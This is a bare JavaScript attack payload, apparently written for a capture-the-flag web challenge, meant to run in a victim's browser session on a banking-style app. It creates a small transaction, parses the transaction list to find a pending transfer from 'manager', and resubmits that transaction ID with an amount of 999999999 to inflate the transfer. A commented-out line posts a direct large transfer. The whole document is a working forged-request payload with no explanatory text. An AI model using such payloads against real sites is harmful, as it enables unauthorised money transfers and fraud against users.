/*fetch('/?action=create-transaction', {method:'POST', body:'recipient=adragos&amount=999999999', headers:{'Content-Type':'application/x-www-form-urlencoded'}})*/

(async function() {
  // Create initial small transaction (amount=1)
  await fetch('/?action=create-transaction', {
    method:'POST', 
    body:'recipient=birdbirdbird&amount=1', 
    headers:{'Content-Type':'application/x-www-form-urlencoded'}
  });
  
  // Fetch transactions list
  const response = await fetch('/?action=transactions-list');
  const html = await response.text();
  
  // Create a DOM parser
  const parser = new DOMParser();
  const doc = parser.parseFromString(html, 'text/html');
  
  // Find all transaction rows
  const rows = doc.querySelectorAll('tbody tr');
  
  // Find our transaction - look for the most recent pending transaction from manager to us
  let transactionId = null;
  for (const row of rows) {
    const cells = row.querySelectorAll('td');
    if (cells.length >= 5) {
      const id = cells[0].textContent.trim();
      const sender = cells[1].textContent.trim();
      const recipient = cells[2].textContent.trim();
      const status = cells[3].textContent.trim();
      
      if (sender === 'manager' && recipient === 'adragos' && (status === 'pending' || status === 'confirmed')) {
        transactionId = id;
      }
    }
  }
  
  // If found, immediately update with large amount
  if (transactionId) {
    await fetch('/?action=create-transaction', {
      method:'POST',
      body:`recipient=birdbirdbird&amount=999999999&transaction_id=${transactionId}`,
      headers:{'Content-Type':'application/x-www-form-urlencoded'}
    });
  }
})();
